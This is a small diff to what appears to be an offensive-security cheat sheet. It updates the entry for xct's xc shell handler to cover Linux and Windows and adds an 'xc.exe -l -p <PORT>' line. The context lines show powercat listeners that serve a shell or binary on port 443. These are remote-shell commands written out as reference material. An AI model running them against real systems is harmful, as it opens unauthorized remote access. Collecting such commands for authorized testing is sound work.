@@ -233,10 +233,12 @@ powercat -l -p 443 -ep
 powercat -l -p 443 -e <BINARY>
 ```
 
-###### [Linux] xct's xc
+###### [Linux / Windows] xct's xc
 
 ```
 xc -l -p <PORT>
+
+xc.exe -l -p <PORT>
 ```
 
 ###### [Linux / Windows] Python ICMP
